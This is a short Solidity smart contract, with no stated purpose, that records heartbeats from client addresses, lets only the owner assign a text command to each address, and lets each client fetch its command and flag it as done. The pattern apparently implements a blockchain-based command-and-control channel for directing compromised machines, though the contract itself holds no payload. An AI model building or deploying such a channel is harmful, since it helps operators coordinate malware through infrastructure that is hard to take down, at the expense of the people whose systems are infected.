//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract EntryPoint {
    address owner;
    mapping(address => uint256) private  heartbeats;
    mapping(address => string) private command;
    mapping(address => bool) private current_command_is_done;
    mapping(address => string) private command_result;
    
    function beat() external {
        heartbeats[msg.sender] = block.number;
    }
    function setCommand(string memory _text,address _addr) external {
        require(msg.sender == owner, "Only owner can call this method");
        command[_addr] = _text;
        current_command_is_done[_addr] = false;
    }
    function getCommand() external view returns (string memory){
        return command[msg.sender];
    }
    
    function setDone(bool isDone) external {
      current_command_is_done[msg.sender] = isDone; 
    }
    function getDone() external view returns (bool){
        return current_command_is_done[msg.sender];
    }
    
    constructor(){
        owner = msg.sender;
    }


}